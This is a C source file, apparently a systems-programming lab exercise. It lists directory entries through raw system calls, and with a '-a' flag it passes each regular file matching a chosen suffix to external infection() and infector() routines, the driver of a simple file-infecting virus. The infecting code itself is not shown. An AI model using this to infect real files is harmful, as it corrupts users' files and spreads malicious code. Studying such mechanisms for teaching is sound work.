#include "util.h"
#include "dirent.h"

#define O_RDONLY 0
#define O_WRONLY 1
#define O_RDRW 2

#define SYS_READ 3
#define SYS_WRITE 4
#define SYSWRITE 4

#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_GETDENTS 141

#define SYS_LSEEK 19
#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define SEEK_SET 0
#define O_CREATE 64
#define SYS_EXIT 1

extern int system_call();
extern void infection();
extern void infector(char* fileName);
extern void code_start();
extern void code_end();
char* sys_return= "System_Call return num";
      char* sys_id= "System_Call_ID";


typedef struct ent {
 int inode;
 int offset;
 short len;
 char buf[];
 
}ent;

void print(char* str){
     system_call(SYS_WRITE, STDOUT, str, strlen(str));    
}


void debugging(char* exp_, char* msg, int toDebag,int mode){

  if(toDebag){
    if(mode==STDIN){
       
        if(*msg=='\n')
            system_call(SYS_WRITE , STDERR , "\n" , 1);
         else
            system_call(SYS_WRITE , STDERR , msg , 1);


    }
    
    else{
      system_call(SYS_WRITE,STDERR, exp_,strlen(exp_));
    system_call(SYS_WRITE,STDERR, ": ",2);
    system_call(SYS_WRITE,STDERR, msg,strlen(msg));
     system_call(SYS_WRITE,STDERR, "\n",1);
       
    }
  }}

int main (int argc , char* argv[], char* envp[])
{
  int fd;
  int nread;
  char buf[8192];
  ent *curDir;
  int pos;  /*the current position in the buffer*/
  char type;
  char suffixChar ; 
 int onlySuffix=0;
 int withInfection=0; 
 int toDebag;

 

 	char * code_start_ = itoa((int)code_start);
    print("str of code_start: ");
    print(code_start_);
    print("\n");
    char * code_end_ = itoa((int)code_end);
    print("str of code_end: ");
    print(code_end_);
    print("\n");



 	int j;
     for(j=1; j<argc; j++)
     {
      if(strcmp(argv[j],"-s")==0)
      {
        onlySuffix=1;
        suffixChar=argv[j+1][0];
      }

      else if(strcmp(argv[j],"-a")==0)
      {
        withInfection=1;
        suffixChar=argv[j+1][0];
      }
      else if(strcmp(argv[j],"-d")==0 ) toDebag=1;
     }

  

 fd = system_call(SYS_OPEN, ".", O_RDONLY, 0777);
      debugging(sys_return,itoa(fd),toDebag,3);
     debugging(sys_id,itoa(SYS_OPEN),toDebag,3);
     if(fd <0){
      print("Error in: opening DIR\n");
      system_call(SYS_EXIT,0x55,1, 1);
    }


 
    nread = system_call(SYS_GETDENTS ,fd ,buf ,8192);
    debugging(sys_return,itoa(nread),toDebag,3);
    debugging(sys_id,itoa(SYS_GETDENTS),toDebag,3);
    if(nread == -1){
      print("Error in: reads dirctions from DIR to buf\n");
      system_call(SYS_EXIT,0x55,1, 1);
    }

    
    
    pos=0; 
    while(pos<nread)
    {
      curDir= (ent*)(buf+pos);/*reading the next struct*/
      type = *(buf + pos + curDir->len - 1); /* getting the type of the file*/
      
      debugging("debugging","",toDebag,3);
      debugging("Name",curDir->buf,toDebag,3);
      debugging("Length",itoa(curDir->len),toDebag,3);
  
      
     
	if(  (!onlySuffix && !withInfection ) || ( type == 8 && (*((curDir->buf)+strlen(curDir->buf)-1) == suffixChar)))/*printing iff type of file is DT_REG(which means 8) and the suffix of file is h*/
	{
        print("\n");
        print("-----with suffix-----\n");
        print("Name: ");
        print(curDir-> buf);
        print("\n");
        print("\n");

      
      if(withInfection)
      {
    	  infection();
    	  infector(curDir->buf);
    	  print("\n");
	    }
  }
      pos = pos+curDir->len;
    }

 
      int returnNum;
      returnNum=system_call(SYS_CLOSE, fd);
      debugging(sys_return,itoa(returnNum),toDebag,3);
      debugging(sys_id,itoa(SYS_CLOSE),toDebag,3);
      print("Done...\n");
      return 0x55;
}
